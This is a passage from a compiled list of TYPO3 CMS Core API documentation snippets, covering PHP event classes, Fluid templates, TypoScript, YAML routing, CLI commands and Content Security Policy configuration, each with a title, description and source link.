],\n];\n```\n\n----------------------------------------\n\nTITLE: Module Menu Items Retrieval Method\nDESCRIPTION: Method to retrieve all allowed modules for menu generation, taking into account TSConfig and appearance settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Backend/ModuleProvider.rst.txt#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\nphp:method:: getModulesForModuleMenu(\\TYPO3\\CMS\\Core\\Authentication\\BackendUserAuthentication $user, bool $respectWorkspaceRestrictions = true)\n:returns: `\\MenuModule[]`\n```\n\n----------------------------------------\n\nTITLE: Fetching Localized Strings with TypoScript getText\nDESCRIPTION: Demonstrates how to use the getText property LLL to fetch and output translations from an XLF file in the current language.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/TypoScript.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nlib.blogListTitle = TEXT\nlib.blogListTitle {\n    data = LLL : EXT:blog_example/Resources/Private/Language/locallang.xlf:blog.list\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Debounced Event Handling in TYPO3 CMS JavaScript\nDESCRIPTION: This snippet demonstrates how to use the DebounceEvent module to create debounced event listeners. It shows two examples: one that executes after waiting for 200ms of inactivity, and another that executes immediately upon the first event and then locks for 200ms. Both listeners are attached to the document body.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/JavaScript/DebounceEvent/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport DebounceEvent from '@typo3/core/event/debounce-event.js';\n\nnew DebounceEvent('mousewheel', function (e) {\n    console.log('Executed 200ms after the last mousewheel event was fired');\n}, 200).bindTo(document.body);\n\nnew DebounceEvent('mousewheel', function (e) {\n    console.log('Executed right after the first 200ms after the last mousewheel event was fired');\n}, 200, true).bindTo(document.body);\n```\n\n----------------------------------------\n\nTITLE: Implementing UsableForConnectionInterface in a Driver Middleware\nDESCRIPTION: Shows how to implement the UsableForConnectionInterface to conditionally apply a middleware based on connection parameters, specifically targeting connections using a custom driver.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Middleware/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace Vendor\\Extension\\DoctrineDBAL;\n\nuse Doctrine\\DBAL\\Driver;\nuse Doctrine\\DBAL\\Driver\\Middleware as DoctrineMiddleware;\nuse Psr\\Log\\LoggerAwareInterface;\nuse Psr\\Log\\LoggerAwareTrait;\nuse TYPO3\\CMS\\Core\\Database\\Middleware\\UsableForConnectionInterface;\n\nclass CustomMiddleware implements DoctrineMiddleware, LoggerAwareInterface, UsableForConnectionInterface\n{\n    use LoggerAwareTrait;\n\n    public function wrap(Driver $driver): Driver\n    {\n        return new CustomDriverDecorator($driver, $this->logger);\n    }\n\n    public function canBeUsedForConnection(string $connectionName, array $connectionParams): bool\n    {\n        if ($connectionParams['driver'] === CustomDriver::class) {\n            return true;\n        }\n\n        if ($connectionParams['driver'] === 'custom_driver') {\n            return true;\n        }\n\n        return false;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing GitHub Link Handling Interface in TYPO3 CMS\nDESCRIPTION: This class implements the LinkHandlingInterface to handle GitHub issue links in TYPO3 CMS. It converts between the t3://github URN format and structured data arrays, allowing TYPO3 to manage GitHub issue links in a standardized way.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/Tutorials/_CustomLinkBrowser/_GitHubLinkHandling.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n/**\n * Resolves GitHub Links\n */\nclass GitHubLinkHandling implements LinkHandlingInterface\n{\n    protected string $baseUrn = 't3://github';\n\n    public function asString(array $parameters): string\n    {\n        $githubIssue = (int)$parameters['issue'];\n        return $this->baseUrn . '?issue=' . $githubIssue;\n    }\n\n    public function resolveHandlerData(array $data): array\n    {\n        return [\n            'issue' => (int)$data['issue'],\n        ];\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Extension Remote in TYPO3 YAML\nDESCRIPTION: This YAML snippet demonstrates how to configure a custom extension remote in TYPO3's Configuration/Services.yaml file. It defines a new remote 'myremote' using the TerExtensionRemote class, sets it as the default remote, and specifies a custom remote base URL.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/CustomExtensionRepository.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nextension.remote.myremote:\n  class: 'TYPO3\\CMS\\Extensionmanager\\Remote\\TerExtensionRemote'\n  arguments:\n    $identifier: 'myremote'\n    $options:\n       remoteBase: 'https://my_own_remote/'\n  tags:\n    - name: 'extension.remote'\n      default: true\n```\n\n----------------------------------------\n\nTITLE: Configuring RotatingFileWriter for Deprecation Log in TYPO3\nDESCRIPTION: Configuration for the RotatingFileWriter to enable log rotation for the deprecation log file in TYPO3. This example configures weekly rotation with a maximum of 52 files to be retained.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Writers/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n// Add log rotation for the deprecation log file\n$GLOBALS['TYPO3_CONF_VARS']['LOG']['TYPO3']['CMS']['deprecations']['writerConfiguration'] = [\n    \\TYPO3\\CMS\\Core\\Log\\LogLevel::NOTICE => [\n        \\TYPO3\\CMS\\Core\\Log\\Writer\\FileWriter::class => [\n            'className' => \\TYPO3\\CMS\\Core\\Log\\Writer\\RotatingFileWriter::class,\n            'options' => [\n                'interval' => 'weekly',\n                'maxFiles' => 52,\n                'logFileInfix' => 'deprecations',\n            ],\n        ],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: TYPO3 AfterContentObjectRendererInitializedEvent Example\nDESCRIPTION: Example implementation showing the event listener for AfterContentObjectRendererInitializedEvent. This event is triggered after ContentObjectRenderer initialization in the start() method.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/AfterContentObjectRendererInitializedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Frontend\\ContentObject\\Event\\AfterContentObjectRendererInitializedEvent\n```\n\n----------------------------------------\n\nTITLE: Configuring Blog Author Routing in TYPO3 CMS\nDESCRIPTION: This YAML configuration sets up routing for the Blog extension's author functionality.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/Examples.rst#2025-04-16_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nrouteEnhancers:\n  BlogAuthor:\n    type: Extbase\n    extension: Blog\n    plugin: AuthorPosts\n    routes:\n      - routePath: '/'\n      - routePath: '/{author_slug}'\n    defaultController: 'Post::listPostsByAuthor'\n    aspects:\n      author_slug:\n        type: PersistedPatternMapper\n        tableName: tx_blog_domain_model_author\n        routeFieldPattern: '^(?P<slug>.+)$'\n        routeFieldResult: '{slug}'\n```\n\n----------------------------------------\n\nTITLE: DELETE Query with TYPO3 Query Builder\nDESCRIPTION: Example of creating a DELETE query to remove records from a table based on specific criteria.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_9\n\nLANGUAGE: php\nCODE:\n```\n// use TYPO3\\CMS\\Core\\Database\\Connection;\n\n// DELETE FROM `tt_content` WHERE `bodytext` = 'lorem'\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('tt_content');\n$affectedRows = $queryBuilder\n    ->delete('tt_content')\n    ->where(\n```\n\n----------------------------------------\n\nTITLE: RST Figure Directive\nDESCRIPTION: Displays user settings interface screenshot with language selection\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/BackendLanguages.rst#2025-04-16_snippet_5\n\nLANGUAGE: rst\nCODE:\n```\n..  figure:: /Images/ManualScreenshots/UserManagement/Users/UserSettingsLanguage.png\n    :alt: The tab \"Personal data\" of the User settings, including field \"Language\"\n```\n\n----------------------------------------\n\nTITLE: Fluid Partial Location (HTML)\nDESCRIPTION: Illustrates the common location for Fluid partials within a TYPO3 extension. Partials are often stored in the `Resources/Private/Partials/` directory and can be included into main Fluid templates using the `<f:render>` ViewHelper.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Resources/Private/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n\"/Resources/Private/Partials/SomePartials.html\"\n```\n\n----------------------------------------\n\nTITLE: EntityAddedToPersistenceEvent Class Path Reference\nDESCRIPTION: The full class path reference for the EntityAddedToPersistenceEvent in TYPO3 CMS Extbase framework.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Extbase/Persistence/EntityAddedToPersistenceEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Extbase\\Event\\Persistence\\EntityAddedToPersistenceEvent\n```\n\n----------------------------------------\n\nTITLE: Defining IsTableExcludedFromReferenceIndexEvent Class in PHP for TYPO3 CMS\nDESCRIPTION: This class is part of the TYPO3\\CMS\\Core\\DataHandling\\Event namespace and is used to handle events related to excluding tables from the Reference Index. It provides methods to get the table name, mark it as excluded, check its exclusion status, and manage event propagation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/IsTableExcludedFromReferenceIndexEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nphp:class:: IsTableExcludedFromReferenceIndexEvent\n\n    Event to intercept if a certain table should be excluded from the Reference Index.\n\n    There is no need to add tables without a definition in $GLOBALS['TCA'] since\n    ReferenceIndex only handles those.\n\n    ..  php:method:: getTable()\n        :returns: `string`\n\n    ..  php:method:: markAsExcluded()\n\n    ..  php:method:: isTableExcluded()\n        :returns: `bool`\n\n    ..  php:method:: isPropagationStopped()\n        :returns: `bool`\n```\n\n----------------------------------------\n\nTITLE: Disabling a Configuration Entry in TYPO3\nDESCRIPTION: This YAML snippet demonstrates how to disable an already registered configuration entry. The `disabled` attribute is set to `true` to prevent the entry from being displayed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/ConfigurationModule/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nlowlevel.configuration.module.provider.services:\n    class: TYPO3\\CMS\\Lowlevel\\ConfigurationModuleProvider\\GlobalVariableProvider\n    tags:\n        - name: 'lowlevel.configuration.module.provider'\n          disabled: true\n```\n\n----------------------------------------\n\nTITLE: Assigning Arrays in PHP for Fluid Templates\nDESCRIPTION: Shows how to assign an array in a PHP controller for use in a Fluid template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\n$this->view->assign('data', ['Low', 'High']);\n```\n\n----------------------------------------\n\nTITLE: Basic cObject ViewHelper Usage in Fluid\nDESCRIPTION: Demonstrates the basic usage of cObject ViewHelper to render a TypoScript object in a Fluid template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/UsingTypoScriptCObjectViewHelper.rst#2025-04-16_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<f:cObject typoscriptObjectPath=\"lib.title\"/>\n```\n\n----------------------------------------\n\nTITLE: Checking Available TYPO3 Extension Updates\nDESCRIPTION: Command to show all extensions that have updates available along with their new version numbers\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/UpgradingExtensions/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ncomposer outdated\n```\n\n----------------------------------------\n\nTITLE: Creating Non-equality Comparison in TYPO3 Database Expressions in PHP\nDESCRIPTION: Example of using the neq() method from the ExpressionBuilder class to create a non-equality SQL expression. This snippet demonstrates how to create a WHERE condition that checks if a user ID is not equal to 1.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/_ExpressionBuilderComparisons.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n// u.id <> 1\n$q->where($q->expr()->neq('u.id', '1'));\n```\n\n----------------------------------------\n\nTITLE: Fluid Layout Example in HTML\nDESCRIPTION: Illustrates a basic Fluid layout file that serves as a wrapper for templates. It uses the render ViewHelper to include content from template sections.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Introduction.rst#2025-04-16_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<f:layout name=\"Default\" />\n<div id=\"page\">\n    <f:render section=\"Main\" />\n</div>\n```\n\n----------------------------------------\n\nTITLE: Chaining ViewHelpers in Fluid Templates\nDESCRIPTION: Shows how to chain multiple ViewHelpers using both tag-based notation and more compact inline notation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_21\n\nLANGUAGE: html\nCODE:\n```\n<!-- tag based notation -->\n<f:format.padding padLength=\"40\"><f:format.date format=\"Y-m-d\">{post.date}</f:format.date></f:format.padding>\n\n<!-- inline notation -->\n{post.date -> f:format.date(format: 'Y-m-d') -> f:format.padding(padLength: 40)}\n```\n\n----------------------------------------\n\nTITLE: Converting ModuleData to Array in TYPO3\nDESCRIPTION: This method converts the ModuleData object to an array, allowing for easy serialization or manipulation of the module data in array format.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/ModuleData.rst.txt#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\n..  php:method:: toArray()\n        :returns: `array`\n```\n\n----------------------------------------\n\nTITLE: Registering Slug Modifier in TYPO3\nDESCRIPTION: Example of registering a TCA slug field modifier and its configuration array structure. Shows how to hook into slug generation for custom modifications.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/ExtendingRouting.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TCA']['pages']['columns']['slug']['config']['generatorOptions']['postModifiers'][] = My\\Class::class . '->modifySlug';\n```\n\nLANGUAGE: php\nCODE:\n```\n[\n    'slug' => 'the slug to be used',\n    'workspaceId' => 'the workspace ID, \"0\" if in live workspace',\n    'configuration' => 'the configuration of the TCA field',\n    'record' => 'the full record to be used',\n    'pid' => 'the resolved parent page ID',\n    'prefix' => 'the prefix that was added',\n    'tableName' => 'the table of the slug field',\n    'fieldName' => 'the field name of the slug field'\n]\n```\n\n----------------------------------------\n\nTITLE: Defining AssetCollector Class in PHP for TYPO3 CMS\nDESCRIPTION: This snippet defines the AssetCollector class with its methods for managing assets. It includes methods for adding and removing JavaScript, CSS, and media assets, as well as retrieving and checking for their existence.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Core/AssetCollector.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nclass AssetCollector\n{\n    public function addJavaScript(string $identifier, string $source, array $attributes = [], array $options = []): self\n    {\n        // Implementation not shown\n    }\n\n    public function addInlineJavaScript(string $identifier, string $source, array $attributes = [], array $options = []): self\n    {\n        // Implementation not shown\n    }\n\n    public function addStyleSheet(string $identifier, string $source, array $attributes = [], array $options = []): self\n    {\n        // Implementation not shown\n    }\n\n    public function addInlineStyleSheet(string $identifier, string $source, array $attributes = [], array $options = []): self\n    {\n        // Implementation not shown\n    }\n\n    public function addMedia(string $fileName, array $additionalInformation): self\n    {\n        // Implementation not shown\n    }\n\n    public function removeJavaScript(string $identifier): self\n    {\n        // Implementation not shown\n    }\n\n    public function removeInlineJavaScript(string $identifier): self\n    {\n        // Implementation not shown\n    }\n\n    public function removeStyleSheet(string $identifier): self\n    {\n        // Implementation not shown\n    }\n\n    public function removeInlineStyleSheet(string $identifier): self\n    {\n        // Implementation not shown\n    }\n\n    public function removeMedia(string $identifier): self\n    {\n        // Implementation not shown\n    }\n\n    public function getMedia(): array\n    {\n        // Implementation not shown\n    }\n\n    public function getJavaScripts(?bool $priority = NULL): array\n    {\n        // Implementation not shown\n    }\n\n    public function getInlineJavaScripts(?bool $priority = NULL): array\n    {\n        // Implementation not shown\n    }\n\n    public function getStyleSheets(?bool $priority = NULL): array\n    {\n        // Implementation not shown\n    }\n\n    public function getInlineStyleSheets(?bool $priority = NULL): array\n    {\n        // Implementation not shown\n    }\n\n    public function hasJavaScript(string $identifier): bool\n    {\n        // Implementation not shown\n    }\n\n    public function hasInlineJavaScript(string $identifier): bool\n    {\n        // Implementation not shown\n    }\n\n    public function hasStyleSheet(string $identifier): bool\n    {\n        // Implementation not shown\n    }\n\n    public function hasInlineStyleSheet(string $identifier): bool\n    {\n        // Implementation not shown\n    }\n\n    public function hasMedia(string $fileName): bool\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving File UID in AfterFileMetaDataDeletedEvent in TYPO3 CMS\nDESCRIPTION: The getFileUid() method in the AfterFileMetaDataDeletedEvent class returns the integer UID of the file whose metadata was deleted. This method is essential for identifying which file was affected when handling custom metadata deletion.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFileMetaDataDeletedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\ngetFileUid()\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Content Import Command\nDESCRIPTION: CLI command for importing TYPO3 page tree data using Composer-based installation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateContent/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 impexp:import [options] [--] [<filename>]\n```\n\n----------------------------------------\n\nTITLE: Using BeforeFlexFormDataStructureParsedEvent in TYPO3 CMS\nDESCRIPTION: This event allows control of FlexForm parsing. When a listener sets a data structure using setDataStructure(), event propagation stops immediately. Listeners should avoid setting empty arrays or strings and instead return without changes when no action is needed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Configuration/BeforeFlexFormDataStructureParsedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Configuration\\Event\\BeforeFlexFormDataStructureParsedEvent\n```\n\n----------------------------------------\n\nTITLE: Defining LoginConfirmedEvent Class Methods in TYPO3\nDESCRIPTION: Defines the LoginConfirmedEvent class with three getter methods for accessing the controller, view, and request objects after a successful frontend login.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/FrontendLogin/LoginConfirmedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nnamespace TYPO3\\CMS\\FrontendLogin\\Event;\n\nclass LoginConfirmedEvent\n{\n    public function getController(): \\TYPO3\\CMS\\FrontendLogin\\Controller\\LoginController\n    {\n    }\n\n    public function getView(): \\TYPO3\\CMS\\Core\\View\\ViewInterface\n    {\n    }\n\n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface\n    {\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Referencing Extbase AbstractEntity Class in PHP\nDESCRIPTION: Shows the PHP class path for TYPO3's AbstractEntity class, which is used as a parent class for Extbase domain models representing database records.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DatabaseRecords/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Extbase\\DomainObject\\AbstractEntity\n```\n\n----------------------------------------\n\nTITLE: Sending Spooled Mails via CLI Command in Bash\nDESCRIPTION: Demonstrates how to send spooled emails using the TYPO3 CLI command for both Composer-based and legacy installations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Mail/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 mailer:spool:send\n```\n\nLANGUAGE: bash\nCODE:\n```\ntypo3/sysext/core/bin/typo3 mailer:spool:send\n```\n\n----------------------------------------\n\nTITLE: Defining Route Class Methods in PHP for TYPO3 CMS Backend Routing\nDESCRIPTION: This snippet defines various methods for the Route class in TYPO3 CMS Backend Routing. It includes methods for getting and setting the path, HTTP methods, options, and individual option values. The class is designed for managing routing configurations in the TYPO3 CMS backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Entity/Route.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nphp:namespace::  TYPO3\\CMS\\Backend\\Routing\n\nphp:class:: Route\n\n    This is a single entity for a Route.\n\n    The architecture is highly inspired by the Symfony Routing Component.\n\n    php:method:: getPath()\n        :returns: `string`\n\n        Returns the path\n\n        :Return description: The path pattern\n\n    php:method:: setPath(?string $pattern)\n        :returns: `\\Route`\n\n        Sets the pattern for the path\n        A pattern must start with a slash and must not have multiple slashes at the beginning because the\n        generated path for this route would be confused with a network path, e.g. '//domain.com/path'.\n\n        This method implements a fluent interface.\n\n        :param $pattern: The path pattern\n        :Return description: The current Route instance\n\n    php:method:: getMethods()\n        :returns: `string[]`\n\n        Returns the uppercased HTTP methods this route is restricted to.\n\n        An empty array means that any method is allowed.\n\n        :Return description: The methods\n\n    php:method:: setMethods(array $methods)\n        :returns: `self`\n\n        Sets the HTTP methods (e.g. ['POST']) this route is restricted to.\n\n        An empty array means that any method is allowed.\n\n        This method implements a fluent interface.\n\n        :param $methods: The array of allowed methods\n\n    php:method:: getOptions()\n        :returns: `array`\n\n        Returns the options set\n\n        :Return description: The options\n\n    php:method:: setOptions(array $options)\n        :returns: `\\Route`\n\n        Sets the options\n\n        This method implements a fluent interface.\n\n        :param $options: The options\n        :Return description: The current Route instance\n\n    php:method:: setOption(?string $name, ?mixed $value)\n        :returns: `\\Route`\n\n        Sets an option value\n\n        This method implements a fluent interface.\n\n        :param $name: An option name\n        :param $value: The option value\n        :Return description: The current Route instance\n\n    php:method:: getOption(?string $name)\n        :returns: `mixed`\n\n        Get an option value\n\n        :param $name: An option name\n        :Return description: The option value or NULL when not given\n\n    php:method:: hasOption(?string $name)\n        :returns: `bool`\n\n        Checks if an option has been set\n\n        :param $name: An option name\n        :Return description: TRUE if the option is set, FALSE otherwise\n```\n\n----------------------------------------\n\nTITLE: Service with Direct Runtime Cache Injection in TYPO3\nDESCRIPTION: Simplified service implementation using direct runtime cache injection.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DependencyInjection/Index.rst#2025-04-16_snippet_10\n\nLANGUAGE: php\nCODE:\n```\nclass MyServiceGettingRuntimeCacheInjected {\n    public function __construct(\n        #[Autowire(service: 'cache.runtime')]\n        private readonly FrontendInterface $runtimeCache\n    ) {}\n\n    public function doSomething(): string\n    {\n        // Use runtime cache directly\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing TYPO3 Backend Controller with Module Template Initialization\nDESCRIPTION: This PHP class implements a backend controller for TYPO3 CMS with methods to initialize a module template and render a blog post. It demonstrates proper dependency injection of server requests and module template creation for backend interfaces.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/_InitializeModuleTemplate.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse T3docs\\BlogExample\\Domain\\Model\\Post;\nuse TYPO3\\CMS\\Backend\\Template\\ModuleTemplate;\n\nclass BackendController extends ActionController\n{\n    protected function initializeModuleTemplate(\n        ServerRequestInterface $request,\n    ): ModuleTemplate {\n        $view = $this->moduleTemplateFactory->create($request);\n\n        $context = '';\n        $this->modifyDocHeaderComponent($view, $context);\n        $view->setFlashMessageQueue($this->getFlashMessageQueue());\n        $view->setTitle(\n            $this->getLanguageService()->sL('LLL:EXT:blog_example/Resources/Private/Language/Module/locallang_mod.xlf:mlang_tabs_tab'),\n            $context,\n        );\n\n        return $view;\n    }\n\n    public function showPostAction(Post $post): ResponseInterface\n    {\n        $view = $this->initializeModuleTemplate($this->request);\n        $view->assign('post', $post);\n        return $view->renderResponse('ShowPost');\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFileMovedEvent Class in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet defines the AfterFileMovedEvent class, which is fired after a file is moved within a resource storage or driver in TYPO3 CMS. It includes methods to retrieve the file, its original folder, and the target folder.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterFileMovedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class AfterFileMovedEvent\n{\n    public function __construct(\n        private readonly FileInterface $file,\n        private readonly FolderInterface $originalFolder,\n        private readonly FolderInterface $folder\n    ) {\n    }\n\n    public function getFile(): FileInterface\n    {\n        return $this->file;\n    }\n\n    public function getOriginalFolder(): FolderInterface\n    {\n        return $this->originalFolder;\n    }\n\n    public function getFolder(): FolderInterface\n    {\n        return $this->folder;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Regular Event Listener in TYPO3\nDESCRIPTION: Demonstrates how to create and bind a regular event listener using the TYPO3/CMS/Core/Event/RegularEvent module. The example shows a click event handler that logs the clicked element to the console.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/JavaScript/RegularEvent/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nimport RegularEvent from '@typo3/core/event/regular-event.js';\n\nnew RegularEvent('click', function (e) {\n    console.log('Clicked element:', e.target);\n}).bindTo(document.getElementById('#'));\n```\n\n----------------------------------------\n\nTITLE: Configuring CSP inherit-again mode in PHP\nDESCRIPTION: Example of using the inherit-again mode in PHP configuration for Content Security Policy. This mode inherits again from the corresponding ancestor chain and merges existing sources.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentSecurityPolicy/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Security\\ContentSecurityPolicy\\Directive;\nuse TYPO3\\CMS\\Core\\Security\\ContentSecurityPolicy\\MutationCollection;\nuse TYPO3\\CMS\\Core\\Security\\ContentSecurityPolicy\\MutationOrigin;\nuse TYPO3\\CMS\\Core\\Security\\ContentSecurityPolicy\\MutationMode;\nuse TYPO3\\CMS\\Core\\Security\\ContentSecurityPolicy\\Mutation;\nuse TYPO3\\CMS\\Core\\Security\\ContentSecurityPolicy\\Source;\n\nreturn [\n    MutationOrigin::default => new MutationCollection(\n        [\n            new Mutation(\n                MutationMode::Set,\n                Directive::DefaultSrc,\n                Source::self,\n                Source::unsafeInline,\n                Source::host('example.com')\n            ),\n        ]\n    ),\n    MutationOrigin::backend => new MutationCollection(\n        [\n            new Mutation(\n                MutationMode::InheritAgain,\n                Directive::ImgSrc,\n                # \"data:\" is merged by inheritance\n            ),\n            new Mutation(\n                MutationMode::Extend,\n                Directive::ImgSrc,\n                Source::self,\n                Source::host('example.com')\n            ),\n        ]\n    ),\n];\n```\n\n----------------------------------------\n\nTITLE: Splitting HTML into Blocks in TYPO3\nDESCRIPTION: This code instantiates the HtmlParser class and splits the HTML content into blocks defined by div and table tags. This method extracts content at the same block level.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ParsingHtml/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n// Splitting HTML into blocks defined by <div> and <table> tags\n$parseObj = \\TYPO3\\CMS\\Core\\Utility\\GeneralUtility::makeInstance(\\TYPO3\\CMS\\Core\\Html\\HtmlParser::class);\n$result = $parseObj->splitIntoBlock('div,table', $testHTML);\n```\n\n----------------------------------------\n\nTITLE: Importing ViewHelper Namespaces with Curly Braces\nDESCRIPTION: Shows how to import a 